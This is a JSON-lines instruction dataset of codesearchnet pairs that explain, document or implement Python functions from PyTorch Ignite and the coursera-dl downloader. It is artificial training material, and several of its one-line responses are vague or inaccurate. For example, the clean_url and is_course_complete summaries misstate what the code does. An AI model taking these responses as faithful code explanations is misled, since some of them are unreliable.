{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _prepare_batch(batch, device=None, non_blocking=False):\n    x, y = batch\n    return (convert_tensor(x, device=device, non_blocking=non_blocking),\n            convert_tensor(y, device=device, non_blocking=non_blocking))", "response": "Prepare batch for training."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create_supervised_trainer(model, optimizer, loss_fn,\n                              device=None, non_blocking=False,\n                              prepare_batch=_prepare_batch,\n                              output_transform=lambda x, y, y_pred, loss: loss.item()):\n    \"\"\"\n    Factory function for creating a trainer for supervised models.\n\n    Args:\n        model (`torch.nn.Module`): the model to train.\n        optimizer (`torch.optim.Optimizer`): the optimizer to use.\n        loss_fn (torch.nn loss function): the loss function to use.\n        device (str, optional): device type specification (default: None).\n            Applies to both model and batches.\n        non_blocking (bool, optional): if True and this copy is between CPU and GPU, the copy may occur asynchronously\n            with respect to the host. For other cases, this argument has no effect.\n        prepare_batch (callable, optional): function that receives `batch`, `device`, `non_blocking` and outputs\n            tuple of tensors `(batch_x, batch_y)`.\n        output_transform (callable, optional): function that receives 'x', 'y', 'y_pred', 'loss' and returns value\n            to be assigned to engine's state.output after each iteration. Default is returning `loss.item()`.\n\n    Note: `engine.state.output` for this engine is defind by `output_transform` parameter and is the loss\n        of the processed batch by default.\n\n    Returns:\n        Engine: a trainer engine with supervised update function.\n    \"\"\"\n    if device:\n        model.to(device)\n\n    def _update(engine, batch):\n        model.train()\n        optimizer.zero_grad()\n        x, y = prepare_batch(batch, device=device, non_blocking=non_blocking)\n        y_pred = model(x)\n        loss = loss_fn(y_pred, y)\n        loss.backward()\n        optimizer.step()\n        return output_transform(x, y, y_pred, loss)\n\n    return Engine(_update)", "response": "Factory function for creating a trainer for supervised models."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create_lr_scheduler_with_warmup(lr_scheduler, warmup_start_value, warmup_end_value, warmup_duration,\n                                    save_history=False,\n                                    output_simulated_values=None):\n    \"\"\"\n    Helper method to create a LR scheduler with a linear warm-up.\n\n    Args:\n        lr_scheduler (ParamScheduler or subclass of `torch.optim.lr_scheduler._LRScheduler`): LR scheduler after\n            the warm-up.\n        warmup_start_value (float): LR start value of the warm-up phase.\n        warmup_end_value (float): LR end value of the warm-up phase.\n        warmup_duration (int): warm-up phase duration, number of events.\n        save_history (bool, optional): whether to log the parameter values to\n            `engine.state.param_history`, (default=False).\n        output_simulated_values (list, optional): optional output of simulated LR values.\n            If output_simulated_values is a list of None, e.g. `[None] * 100`, after the execution it will be filled\n            by 100 simulated LR values.\n\n    Returns:\n        ConcatScheduler: LR scheduler with linear warm-up.\n\n\n    .. code-block:: python\n\n        torch_lr_scheduler = ExponentialLR(optimizer=optimizer, gamma=0.98)\n        lr_values = [None] * 100\n        scheduler = create_lr_scheduler_with_warmup(torch_lr_scheduler,\n                                                    warmup_start_value=0.0, warmup_end_value=0.1, warmup_duration=10,\n                                                    output_simulated_values=lr_values)\n        lr_values = np.array(lr_values)\n        # Plot simulated values\n        plt.plot(lr_values[:, 0], lr_values[:, 1], label=\"learning rate\")\n\n        # Attach to the trainer\n        trainer.add_event_handler(Events.ITERATION_STARTED, scheduler)\n\n    \"\"\"\n    if not isinstance(lr_scheduler, (ParamScheduler, _LRScheduler)):\n        raise TypeError(\"Argument lr_scheduler should be a subclass of torch.optim.lr_scheduler._LRScheduler or \"\n                        \"ParamScheduler, but given {}\".format(type(lr_scheduler)))\n\n    if isinstance(lr_scheduler, _LRScheduler):\n        lr_scheduler = LRScheduler(lr_scheduler)\n\n    dummy_optimizer = {}\n    warmup_scheduler = LinearCyclicalScheduler(dummy_optimizer, param_name=\"lr\",\n                                               start_value=warmup_start_value,\n                                               end_value=warmup_end_value,\n                                               cycle_size=warmup_duration * 2)\n\n    warmup_scheduler.optimizer_param_groups = lr_scheduler.optimizer_param_groups\n\n    schedulers = [warmup_scheduler, lr_scheduler]\n    durations = [warmup_duration, ]\n    combined_scheduler = ConcatScheduler(schedulers, durations=durations,\n                                         save_history=save_history)\n    if output_simulated_values is not None:\n        if not isinstance(output_simulated_values, list):\n            raise TypeError(\"Argument output_simulated_values should be a list of None, e.g. `[None] * 100`, \"\n                            \"but given {}.\".format(type(output_simulated_values)))\n        num_events = len(output_simulated_values)\n        result = ConcatScheduler.simulate_values(num_events=num_events, schedulers=schedulers, durations=durations)\n        for i in range(num_events):\n            output_simulated_values[i] = result[i]\n    return combined_scheduler", "response": "Helper method to create a new LR scheduler with a linear warm - up."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_param(self):\n        lr_list = self.lr_scheduler.get_lr()\n        if len(lr_list) > 1:\n            raise ValueError(\"Optimizer passed to lr_scheduler should have a single param group, \"\n                             \"but currently there are {} param groups\".format(len(lr_list)))\n        return lr_list[0]", "response": "Method to get current optimizer s parameter value"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef simulate_values(cls, num_events, lr_scheduler, **kwargs):\n        # This scheduler uses `torch.optim.lr_scheduler._LRScheduler` which\n        # should be replicated in order to simulate LR values and\n        # not perturb original scheduler.\n        copy_lr_scheduler = LRScheduler._replicate_lr_scheduler(lr_scheduler)\n        values = []\n        scheduler = cls(save_history=False, lr_scheduler=copy_lr_scheduler)\n        for i in range(num_events):\n            scheduler(engine=None)\n            values.append([i, scheduler.optimizer_param_groups[0][scheduler.param_name]])\n\n        return values", "response": "Method to simulate scheduled values during num_events events."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef check_manual_seed(seed):\n\n    seed = seed or random.randint(1, 10000)\n    random.seed(seed)\n    torch.manual_seed(seed)\n\n    print('Using manual seed: {seed}'.format(seed=seed))", "response": "Check if manual seed is specified and communicate it to the user."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef attach(self, engine, log_handler, event_name):\n        if event_name not in State.event_to_attr:\n            raise RuntimeError(\"Unknown event name '{}'\".format(event_name))\n\n        engine.add_event_handler(event_name, log_handler, self, event_name)", "response": "Attach the logger to the engine and execute log_handler function at event_name events."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nattach callbacks to control the timer.", "response": "def attach(self, engine, start=Events.STARTED, pause=Events.COMPLETED, resume=None, step=None):\n        \"\"\" Register callbacks to control the timer.\n\n        Args:\n            engine (Engine):\n                Engine that this timer will be attached to.\n            start (Events):\n                Event which should start (reset) the timer.\n            pause (Events):\n                Event which should pause the timer.\n            resume (Events, optional):\n                Event which should resume the timer.\n            step (Events, optional):\n                Event which should call the `step` method of the counter.\n\n        Returns:\n            self (Timer)\n\n        \"\"\"\n\n        engine.add_event_handler(start, self.reset)\n        engine.add_event_handler(pause, self.pause)\n\n        if resume is not None:\n            engine.add_event_handler(resume, self.resume)\n\n        if step is not None:\n            engine.add_event_handler(step, self.step)\n\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add_scalar(self, logger, k, v, event_name, global_step):\n        if k not in self.windows:\n            self.windows[k] = {\n                'win': None,\n                'opts': {\n                    'title': k,\n                    'xlabel': str(event_name),\n                    'ylabel': k,\n                    'showlegend': self.show_legend\n                }\n            }\n\n        update = None if self.windows[k]['win'] is None else 'append'\n\n        kwargs = {\n            \"X\": [global_step, ],\n            \"Y\": [v, ],\n            \"env\": logger.vis.env,\n            \"win\": self.windows[k]['win'],\n            \"update\": update,\n            \"opts\": self.windows[k]['opts'],\n            \"name\": k\n        }\n\n        future = logger.executor.submit(logger.vis.line, **kwargs)\n        if self.windows[k]['win'] is None:\n            self.windows[k]['win'] = future.result()", "response": "Adds a scalar to the hierarchy of windows."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert seconds to hours mins and seconds.", "response": "def _to_hours_mins_secs(time_taken):\n    \"\"\"Convert seconds to hours, mins, and seconds.\"\"\"\n    mins, secs = divmod(time_taken, 60)\n    hours, mins = divmod(mins, 60)\n    return hours, mins, secs"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse_args(args=None):\n\n    parse_kwargs = {\n        \"description\":  'Download Coursera.org lecture material and resources.'\n    }\n\n    conf_file_path = os.path.join(os.getcwd(), LOCAL_CONF_FILE_NAME)\n    if os.path.isfile(conf_file_path):\n        parse_kwargs[\"default_config_files\"] = [conf_file_path]\n    parser = argparse.ArgParser(**parse_kwargs)\n\n    # Basic options\n    group_basic = parser.add_argument_group('Basic options')\n\n    group_basic.add_argument(\n        'class_names',\n        action='store',\n        nargs='*',\n        help='name(s) of the class(es) (e.g. \"ml-005\")')\n\n    group_basic.add_argument(\n        '-u',\n        '--username',\n        dest='username',\n        action='store',\n        default=None,\n        help='username (email) that you use to login to Coursera')\n\n    group_basic.add_argument(\n        '-p',\n        '--password',\n        dest='password',\n        action='store',\n        default=None,\n        help='coursera password')\n\n    group_basic.add_argument(\n        '--jobs',\n        dest='jobs',\n        action='store',\n        default=1,\n        type=int,\n        help='number of parallel jobs to use for '\n        'downloading resources. (Default: 1)')\n\n    group_basic.add_argument(\n        '--download-delay',\n        dest='download_delay',\n        action='store',\n        default=60,\n        type=int,\n        help='number of seconds to wait before downloading '\n        'next course. (Default: 60)')\n\n    group_basic.add_argument(\n        '-b',  # FIXME: kill this one-letter option\n        '--preview',\n        dest='preview',\n        action='store_true',\n        default=False,\n        help='get videos from preview pages. (Default: False)')\n\n    group_basic.add_argument(\n        '--path',\n        dest='path',\n        action='store',\n        default='',\n        help='path to where to save the file. (Default: current directory)')\n\n    group_basic.add_argument(\n        '-sl',  # FIXME: deprecate this option\n        '--subtitle-language',\n        dest='subtitle_language',\n        action='store',\n        default='all',\n        help='Choose language to download subtitles and transcripts.'\n        '(Default: all) Use special value \"all\" to download all available.'\n        'To download subtitles and transcripts of multiple languages,'\n        'use comma(s) (without spaces) to seperate the names of the languages,'\n        ' i.e., \"en,zh-CN\".'\n        'To download subtitles and transcripts of alternative language(s) '\n        'if only the current language is not available,'\n        'put an \"|<lang>\" for each of the alternative languages after '\n        'the current language, i.e., \"en|fr,zh-CN|zh-TW|de\", and make sure '\n        'the parameter are wrapped with quotes when \"|\" presents.'\n\n    )\n\n    # Selection of material to download\n    group_material = parser.add_argument_group(\n        'Selection of material to download')\n\n    group_material.add_argument(\n        '--specialization',\n        dest='specialization',\n        action='store_true',\n        default=False,\n        help='treat given class names as specialization names and try to '\n        'download its courses, if available. Note that there are name '\n        'clashes, e.g. \"machine-learning\" is both a course and a '\n        'specialization (Default: False)')\n\n    group_material.add_argument(\n        '--only-syllabus',\n        dest='only_syllabus',\n        action='store_true',\n        default=False,\n        help='download only syllabus, skip course content. '\n        '(Default: False)')\n\n    group_material.add_argument(\n        '--download-quizzes',\n        dest='download_quizzes',\n        action='store_true',\n        default=False,\n        help='download quiz and exam questions. (Default: False)')\n\n    group_material.add_argument(\n        '--download-notebooks',\n        dest='download_notebooks',\n        action='store_true',\n        default=False,\n        help='download Python Jupyther Notebooks. (Default: False)')\n\n    group_material.add_argument(\n        '--about',  # FIXME: should be --about-course\n        dest='about',\n        action='store_true',\n        default=False,\n        help='download \"about\" metadata. (Default: False)')\n\n    group_material.add_argument(\n        '-f',\n        '--formats',\n        dest='file_formats',\n        action='store',\n        default='all',\n        help='file format extensions to be downloaded in'\n        ' quotes space separated, e.g. \"mp4 pdf\" '\n        '(default: special value \"all\")')\n\n    group_material.add_argument(\n        '--ignore-formats',\n        dest='ignore_formats',\n        action='store',\n        default=None,\n        help='file format extensions of resources to ignore'\n        ' (default: None)')\n\n    group_material.add_argument(\n        '-sf',  # FIXME: deprecate this option\n        '--section_filter',\n        dest='section_filter',\n        action='store',\n        default=None,\n        help='only download sections which contain this'\n        ' regex (default: disabled)')\n\n    group_material.add_argument(\n        '-lf',  # FIXME: deprecate this option\n        '--lecture_filter',\n        dest='lecture_filter',\n        action='store',\n        default=None,\n        help='only download lectures which contain this regex'\n        ' (default: disabled)')\n\n    group_material.add_argument(\n        '-rf',  # FIXME: deprecate this option\n        '--resource_filter',\n        dest='resource_filter',\n        action='store',\n        default=None,\n        help='only download resources which match this regex'\n        ' (default: disabled)')\n\n    group_material.add_argument(\n        '--video-resolution',\n        dest='video_resolution',\n        action='store',\n        default='540p',\n        help='video resolution to download (default: 540p); '\n        'only valid for on-demand courses; '\n        'only values allowed: 360p, 540p, 720p')\n\n    group_material.add_argument(\n        '--disable-url-skipping',\n        dest='disable_url_skipping',\n        action='store_true',\n        default=False,\n        help='disable URL skipping, all URLs will be '\n        'downloaded (default: False)')\n\n    # Parameters related to external downloaders\n    group_external_dl = parser.add_argument_group('External downloaders')\n\n    group_external_dl.add_argument(\n        '--wget',\n        dest='wget',\n        action='store',\n        nargs='?',\n        const='wget',\n        default=None,\n        help='use wget for downloading,'\n        'optionally specify wget bin')\n\n    group_external_dl.add_argument(\n        '--curl',\n        dest='curl',\n        action='store',\n        nargs='?',\n        const='curl',\n        default=None,\n        help='use curl for downloading,'\n        ' optionally specify curl bin')\n\n    group_external_dl.add_argument(\n        '--aria2',\n        dest='aria2',\n        action='store',\n        nargs='?',\n        const='aria2c',\n        default=None,\n        help='use aria2 for downloading,'\n        ' optionally specify aria2 bin')\n\n    group_external_dl.add_argument(\n        '--axel',\n        dest='axel',\n        action='store',\n        nargs='?',\n        const='axel',\n        default=None,\n        help='use axel for downloading,'\n        ' optionally specify axel bin')\n\n    group_external_dl.add_argument(\n        '--downloader-arguments',\n        dest='downloader_arguments',\n        default='',\n        help='additional arguments passed to the'\n        ' downloader')\n\n    parser.add_argument(\n        '--list-courses',\n        dest='list_courses',\n        action='store_true',\n        default=False,\n        help='list course names (slugs) and quit. Listed '\n        'course names can be put into program arguments')\n\n    parser.add_argument(\n        '--resume',\n        dest='resume',\n        action='store_true',\n        default=False,\n        help='resume incomplete downloads (default: False)')\n\n    parser.add_argument(\n        '-o',\n        '--overwrite',\n        dest='overwrite',\n        action='store_true',\n        default=False,\n        help='whether existing files should be overwritten'\n        ' (default: False)')\n\n    parser.add_argument(\n        '--verbose-dirs',\n        dest='verbose_dirs',\n        action='store_true',\n        default=False,\n        help='include class name in section directory name')\n\n    parser.add_argument(\n        '--quiet',\n        dest='quiet',\n        action='store_true',\n        default=False,\n        help='omit as many messages as possible'\n        ' (only printing errors)')\n\n    parser.add_argument(\n        '-r',\n        '--reverse',\n        dest='reverse',\n        action='store_true',\n        default=False,\n        help='download sections in reverse order')\n\n    parser.add_argument(\n        '--combined-section-lectures-nums',\n        dest='combined_section_lectures_nums',\n        action='store_true',\n        default=False,\n        help='include lecture and section name in final files')\n\n    parser.add_argument(\n        '--unrestricted-filenames',\n        dest='unrestricted_filenames',\n        action='store_true',\n        default=False,\n        help='Do not limit filenames to be ASCII-only')\n\n    # Advanced authentication\n    group_adv_auth = parser.add_argument_group(\n        'Advanced authentication options')\n\n    group_adv_auth.add_argument(\n        '-c',\n        '--cookies_file',\n        dest='cookies_file',\n        action='store',\n        default=None,\n        help='full path to the cookies.txt file')\n\n    group_adv_auth.add_argument(\n        '-n',\n        '--netrc',\n        dest='netrc',\n        nargs='?',\n        action='store',\n        const=True,\n        default=False,\n        help='use netrc for reading passwords, uses default'\n        ' location if no path specified')\n\n    group_adv_auth.add_argument(\n        '-k',\n        '--keyring',\n        dest='use_keyring',\n        action='store_true',\n        default=False,\n        help='use keyring provided by operating system to '\n        'save and load credentials')\n\n    group_adv_auth.add_argument(\n        '--clear-cache',\n        dest='clear_cache',\n        action='store_true',\n        default=False,\n        help='clear cached cookies')\n\n    # Advanced miscellaneous options\n    group_adv_misc = parser.add_argument_group(\n        'Advanced miscellaneous options')\n\n    group_adv_misc.add_argument(\n        '--hook',\n        dest='hooks',\n        action='append',\n        default=[],\n        help='hooks to run when finished')\n\n    group_adv_misc.add_argument(\n        '-pl',\n        '--playlist',\n        dest='playlist',\n        action='store_true',\n        default=False,\n        help='generate M3U playlists for course weeks')\n\n    group_adv_misc.add_argument(\n        '--mathjax-cdn',\n        dest='mathjax_cdn_url',\n        default='https://cdn.mathjax.org/mathjax/latest/MathJax.js',\n        help='the cdn address of MathJax.js'\n    )\n\n    # Debug options\n    group_debug = parser.add_argument_group('Debugging options')\n\n    group_debug.add_argument(\n        '--skip-download',\n        dest='skip_download',\n        action='store_true',\n        default=False,\n        help='for debugging: skip actual downloading of files')\n\n    group_debug.add_argument(\n        '--debug',\n        dest='debug',\n        action='store_true',\n        default=False,\n        help='print lots of debug information')\n\n    group_debug.add_argument(\n        '--cache-syllabus',\n        dest='cache_syllabus',\n        action='store_true',\n        default=False,\n        help='cache course syllabus into a file')\n\n    group_debug.add_argument(\n        '--version',\n        dest='version',\n        action='store_true',\n        default=False,\n        help='display version and exit')\n\n    group_debug.add_argument(\n        '-l',  # FIXME: remove short option from rarely used ones\n        '--process_local_page',\n        dest='local_page',\n        help='uses or creates local cached version of syllabus'\n        ' page')\n\n    # Final parsing of the options\n    args = parser.parse_args(args)\n\n    # Initialize the logging system first so that other functions\n    # can use it right away\n    if args.debug:\n        logging.basicConfig(level=logging.DEBUG,\n                            format='%(name)s[%(funcName)s] %(message)s')\n    elif args.quiet:\n        logging.basicConfig(level=logging.ERROR,\n                            format='%(name)s: %(message)s')\n    else:\n        logging.basicConfig(level=logging.INFO,\n                            format='%(message)s')\n\n    if class_name_arg_required(args) and not args.class_names:\n        parser.print_usage()\n        logging.error('You must supply at least one class name')\n        sys.exit(1)\n\n    # show version?\n    if args.version:\n        # we use print (not logging) function because version may be used\n        # by some external script while logging may output excessive\n        # information\n        print(__version__)\n        sys.exit(0)\n\n    # turn list of strings into list\n    args.downloader_arguments = args.downloader_arguments.split()\n\n    # turn list of strings into list\n    args.file_formats = args.file_formats.split()\n\n    # decode path so we can work properly with cyrillic symbols on different\n    # versions on Python\n    args.path = decode_input(args.path)\n\n    # check arguments\n    if args.use_keyring and args.password:\n        logging.warning(\n            '--keyring and --password cannot be specified together')\n        args.use_keyring = False\n\n    if args.use_keyring and not keyring:\n        logging.warning('The python module `keyring` not found.')\n        args.use_keyring = False\n\n    if args.cookies_file and not os.path.exists(args.cookies_file):\n        logging.error('Cookies file not found: %s', args.cookies_file)\n        sys.exit(1)\n\n    if not args.cookies_file:\n        try:\n            args.username, args.password = get_credentials(\n                username=args.username, password=args.password,\n                netrc=args.netrc, use_keyring=args.use_keyring)\n        except CredentialsError as e:\n            logging.error(e)\n            sys.exit(1)\n\n    return args", "response": "Parse the command line arguments and return a new object."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a pseudo - random string of specified length.", "response": "def random_string(length):\n    \"\"\"\n    Return a pseudo-random string of specified length.\n    \"\"\"\n    valid_chars = string_ascii_letters + string_digits\n\n    return ''.join(random.choice(valid_chars) for i in range(length))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef clean_filename(s, minimal_change=False):\n\n    # First, deal with URL encoded strings\n    h = html_parser.HTMLParser()\n    s = h.unescape(s)\n    s = unquote_plus(s)\n\n    # Strip forbidden characters\n    # https://msdn.microsoft.com/en-us/library/windows/desktop/aa365247(v=vs.85).aspx\n    s = (\n        s.replace(':', '-')\n        .replace('/', '-')\n        .replace('<', '-')\n        .replace('>', '-')\n        .replace('\"', '-')\n        .replace('\\\\', '-')\n        .replace('|', '-')\n        .replace('?', '-')\n        .replace('*', '-')\n        .replace('\\x00', '-')\n        .replace('\\n', ' ')\n    )\n\n    # Remove trailing dots and spaces; forbidden on Windows\n    s = s.rstrip(' .')\n\n    if minimal_change:\n        return s\n\n    s = s.replace('(', '').replace(')', '')\n    s = s.rstrip('.')  # Remove excess of trailing dots\n\n    s = s.strip().replace(' ', '_')\n    valid_chars = '-_.()%s%s' % (string.ascii_letters, string.digits)\n    return ''.join(c for c in s if c in valid_chars)", "response": "Sanitize a string to be used as a filename."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nnormalize path on Windows OS.", "response": "def normalize_path(path):\n    \"\"\"\n    Normalizes path on Windows OS. This means prepending\n    <backslash><backslash>?<backslash> to the path to get access to\n    Win32 device namespace instead of Win32 file namespace.\n    See https://msdn.microsoft.com/en-us/library/aa365247%28v=vs.85%29.aspx#maxpath\n\n    @param path: Path to normalize.\n    @type path: str\n\n    @return: Normalized path.\n    @rtype str\n    \"\"\"\n    if sys.platform != 'win32':\n        return path\n\n    if path.startswith(WINDOWS_UNC_PREFIX):\n        return path\n\n    return WINDOWS_UNC_PREFIX + os.path.abspath(path)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nextract the resource file - type format from the anchor.", "response": "def get_anchor_format(a):\n    \"\"\"\n    Extract the resource file-type format from the anchor.\n    \"\"\"\n\n    # (. or format=) then (file_extension) then (? or $)\n    # e.g. \"...format=txt\" or \"...download.mp4?...\"\n    fmt = re.search(r\"(?:\\.|format=)(\\w+)(?:\\?.*)?$\", a)\n    return fmt.group(1) if fmt else None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef clean_url(url):\n    parsed = urlparse(url.strip())\n    reconstructed = ParseResult(\n        parsed.scheme, parsed.netloc, parsed.path,\n        params='', query='', fragment='')\n    return reconstructed.geturl()", "response": "Clean a URL to be used in a URL - based URL parser."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef fix_url(url):\n    if url is None:\n        return None\n\n    url = url.strip()\n\n    if url and not urlparse(url).scheme:\n        url = \"http://\" + url\n\n    return url", "response": "Fixes the URL to be a valid URL."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef is_course_complete(last_update):\n    rv = False\n    if last_update >= 0:\n        delta = time.time() - last_update\n        max_delta = total_seconds(datetime.timedelta(days=30))\n        if delta > max_delta:\n            rv = True\n    return rv", "response": "Determines if a given course has been terminated or not."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef make_coursera_absolute_url(url):\n\n    if not bool(urlparse(url).netloc):\n        return urljoin(COURSERA_URL, url)\n\n    return url", "response": "Make coursera absolute url."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef extend_supplement_links(destination, source):\n    for key, value in iteritems(source):\n        if key not in destination:\n            destination[key] = value\n        else:\n            destination[key].extend(value)", "response": "Extends the destination dictionary with supplement_links\n    from source dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef print_ssl_error_message(exception):\n    message = \"\"\"\n#####################################################################\n# ATTENTION! PLEASE READ THIS!\n#\n# The following error has just occurred:\n# %s %s\n#\n# Please read instructions on how to fix this error here:\n# https://github.com/coursera-dl/coursera-dl#sslerror-errno-1-_sslc504-error14094410ssl-routinesssl3_read_bytessslv3-alert-handshake-failure\n#####################################################################\n\"\"\" % (type(exception).__name__, str(exception))\n    logging.error(message)", "response": "Print SSLError message with URL to instructions on how to fix it."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list_courses(args):\n    session = get_session()\n    login(session, args.username, args.password)\n    extractor = CourseraExtractor(session)\n    courses = extractor.list_courses()\n    logging.info('Found %d courses', len(courses))\n    for course in courses:\n        logging.info(course)", "response": "List enrolled courses.\n\n    @param args: Command-line arguments.\n    @type args: namedtuple"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef download_on_demand_class(session, args, class_name):\n\n    error_occurred = False\n    extractor = CourseraExtractor(session)\n\n    cached_syllabus_filename = '%s-syllabus-parsed.json' % class_name\n    if args.cache_syllabus and os.path.isfile(cached_syllabus_filename):\n        modules = slurp_json(cached_syllabus_filename)\n    else:\n        error_occurred, modules = extractor.get_modules(\n            class_name,\n            args.reverse,\n            args.unrestricted_filenames,\n            args.subtitle_language,\n            args.video_resolution,\n            args.download_quizzes,\n            args.mathjax_cdn_url,\n            args.download_notebooks\n        )\n\n    if is_debug_run or args.cache_syllabus():\n        spit_json(modules, cached_syllabus_filename)\n\n    if args.only_syllabus:\n        return error_occurred, False\n\n    downloader = get_downloader(session, class_name, args)\n    downloader_wrapper = ParallelDownloader(downloader, args.jobs) \\\n        if args.jobs > 1 else ConsecutiveDownloader(downloader)\n\n    # obtain the resources\n\n    ignored_formats = []\n    if args.ignore_formats:\n        ignored_formats = args.ignore_formats.split(\",\")\n\n    course_downloader = CourseraDownloader(\n        downloader_wrapper,\n        commandline_args=args,\n        class_name=class_name,\n        path=args.path,\n        ignored_formats=ignored_formats,\n        disable_url_skipping=args.disable_url_skipping\n    )\n\n    completed = course_downloader.download_modules(modules)\n\n    # Print skipped URLs if any\n    if course_downloader.skipped_urls:\n        print_skipped_urls(course_downloader.skipped_urls)\n\n    # Print failed URLs if any\n    # FIXME: should we set non-zero exit code if we have failed URLs?\n    if course_downloader.failed_urls:\n        print_failed_urls(course_downloader.failed_urls)\n\n    return error_occurred, completed", "response": "Download all requested resources from the on - demand class given in class_name."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef download_class(session, args, class_name):\n    logging.debug('Downloading new style (on demand) class %s', class_name)\n    return download_on_demand_class(session, args, class_name)", "response": "Try to download on - demand class."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef prepare_auth_headers(session, include_cauth=False):\n\n    # csrftoken is simply a 20 char random string.\n    csrftoken = random_string(20)\n\n    # Now make a call to the authenticator url.\n    csrf2cookie = 'csrf2_token_%s' % random_string(8)\n    csrf2token = random_string(24)\n    cookie = \"csrftoken=%s; %s=%s\" % (csrftoken, csrf2cookie, csrf2token)\n\n    if include_cauth:\n        CAUTH = session.cookies.get('CAUTH')\n        cookie = \"CAUTH=%s; %s\" % (CAUTH, cookie)\n\n    logging.debug('Forging cookie header: %s.', cookie)\n    headers = {\n        'Cookie': cookie,\n        'X-CSRFToken': csrftoken,\n        'X-CSRF2-Cookie': csrf2cookie,\n        'X-CSRF2-Token': csrf2token\n    }\n\n    return headers", "response": "This function prepares headers with CSRF and CAUTH tokens that can be used in POST requests such as login and get_quiz."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef login(session, username, password, class_name=None):\n\n    logging.debug('Initiating login.')\n    try:\n        session.cookies.clear('.coursera.org')\n        logging.debug('Cleared .coursera.org cookies.')\n    except KeyError:\n        logging.debug('There were no .coursera.org cookies to be cleared.')\n\n    # Hit class url\n    if class_name is not None:\n        class_url = CLASS_URL.format(class_name=class_name)\n        r = requests.get(class_url, allow_redirects=False)\n        try:\n            r.raise_for_status()\n        except requests.exceptions.HTTPError as e:\n            logging.error(e)\n            raise ClassNotFound(class_name)\n\n    headers = prepare_auth_headers(session, include_cauth=False)\n\n    data = {\n        'email': username,\n        'password': password,\n        'webrequest': 'true'\n    }\n\n    # Auth API V3\n    r = session.post(AUTH_URL_V3, data=data,\n                     headers=headers, allow_redirects=False)\n    try:\n        r.raise_for_status()\n\n        # Some how the order of cookies parameters are important\n        # for coursera!!!\n        v = session.cookies.pop('CAUTH')\n        session.cookies.set('CAUTH', v)\n    except requests.exceptions.HTTPError as e:\n        raise AuthenticationFailed('Cannot login on coursera.org: %s' % e)\n\n    logging.info('Logged in on coursera.org.')", "response": "Login on coursera. org with the given credentials."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nauthenticate on class. coursera. org and return the object.", "response": "def down_the_wabbit_hole(session, class_name):\n    \"\"\"\n    Authenticate on class.coursera.org\n    \"\"\"\n\n    auth_redirector_url = AUTH_REDIRECT_URL.format(class_name=class_name)\n    r = session.get(auth_redirector_url)\n\n    logging.debug('Following %s to authenticate on class.coursera.org.',\n                  auth_redirector_url)\n\n    try:\n        r.raise_for_status()\n    except requests.exceptions.HTTPError as e:\n        raise AuthenticationFailed(\n            'Cannot login on class.coursera.org: %s' % e)\n\n    logging.debug('Exiting \"deep\" authentication.')"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the necessary cookies to authenticate on class. coursera. org.", "response": "def get_authentication_cookies(session, class_name, username, password):\n    \"\"\"\n    Get the necessary cookies to authenticate on class.coursera.org.\n\n    To access the class pages we need two cookies on class.coursera.org:\n        csrf_token, session\n    \"\"\"\n\n    # First, check if we already have the .coursera.org cookies.\n    if session.cookies.get('CAUTH', domain=\".coursera.org\"):\n        logging.debug('Already logged in on accounts.coursera.org.')\n    else:\n        login(session, username, password, class_name=class_name)\n\n    try:\n        session.cookies.clear('class.coursera.org', '/' + class_name)\n    except KeyError:\n        pass\n\n    down_the_wabbit_hole(session, class_name)\n\n    enough = do_we_have_enough_cookies(session.cookies, class_name)\n\n    if not enough:\n        raise AuthenticationFailed('Did not find necessary cookies.')\n\n    logging.info('Found authentication cookies.')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef do_we_have_enough_cookies(cj, class_name):\n    domain = 'class.coursera.org'\n    path = \"/\" + class_name\n\n    return cj.get('csrf_token', domain=domain, path=path) is not None", "response": "Check whether we have enough cookies to authenticate on class. coursera. org."}
